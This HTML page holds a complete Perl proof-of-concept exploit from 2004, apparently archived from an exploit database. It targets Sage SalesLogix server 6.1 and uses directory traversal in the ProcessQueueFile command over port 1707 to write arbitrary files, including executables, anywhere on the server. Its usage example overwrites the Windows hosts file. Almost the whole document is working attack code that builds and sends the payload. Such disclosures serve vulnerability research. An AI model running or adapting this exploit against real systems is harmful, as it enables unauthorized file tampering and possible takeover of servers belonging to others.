<html><head><title>SLX Server 6.1 Arbitrary File Creation Exploit (PoC)</title></head><pre>#!/usr/bin/perl
#
# Proof of concept exploit: Arbitrary file creation for SLX server 6.1
#
# Written by Carl Livitt, Agenda Security Services, June 2004.
#
# This exploit abuses the ProcessQueueFile command on SLX 6.1 (others?)
servers
# to create arbitrary files on the filesystem of the SLX server. By
using
# directory traversal, it is possible to escape from the Queue directory
and
# write anywhere on the SLX server's filesystem.
#

use IO::Socket;

print &quot;slx_uploader - Uploads arbitrary files to Sage SalesLogix
servers.\n&quot;;
print &quot;By Carl Livitt @ Agenda Security Services, June 2004\n\n&quot;;

if($#ARGV!=2) {
      print &quot;Syntax: $0 host filename_to_create file_to_upload\n\n&quot;;
      print &quot;Example:\n&quot;;
      print &quot;  $0 10.0.0.100
\\\\winnt\\\\system32\\\\drivers\\\\etc\\\\hosts evil.txt\n\n&quot;;
      print &quot;The above example would upload the local file 'evil.txt'
to the SLX\n&quot;;
      print &quot;server on 10.0.0.100, overwriting the existing hosts
file.\n&quot;;
      print &quot;It is possible to upload binary files, e.g. executables,
with this exploit.\n\n&quot;;

      exit(1);
} else {
      $host=$ARGV[0];
      $create_file=$ARGV[1];
      $upload_file=$ARGV[2];
}

if((stat($upload_file))[7] &gt; 4096) {
      print &quot;[*] Error! Files to be uploaded must be less than 4k in
size.\n\n&quot;;
      exit(1);
}

print &quot;[+] Building payload\n&quot;;
$contentLen=43 + length($create_file);
$exploit=&quot;\x00&quot;x10 . chr($contentLen) . &quot;\x00&quot;x3 .
&quot;ProcessQueueFile\x00&quot; . &quot;..\\&quot;x8 . &quot;$create_file&quot; . &quot;\x00&quot;x6;

open(UPLOAD, '&lt;', $upload_file) || die &quot;Could not open local file
$upload_file\n&quot;;

while(($line=&lt;UPLOAD&gt;)) {
      $exploit.=$line;
}

close(UPLOAD);

print &quot;[+] Connecting to server $host:1707\n&quot;;
$sock=IO::Socket::INET-&gt;new(&quot;$host:1707&quot;) || do {print &quot;[-] Could not
connect to server\n&quot;; exit(1); };

print &quot;[+] Sending exploit payload\n&quot;;
send($sock,$exploit,0);

print &quot;[+] Waiting for response\n&quot;;
$sock-&gt;recv($data,1024,0);

if($data =~ /Received/) {
      print &quot;[+] Exploit successful\n&quot;;
} else {
      print &quot;[*] Exploit may not have worked.\n&quot;;
}

$sock-&gt;shutdown(2);

# milw0rm.com [2004-10-18]</pre></html>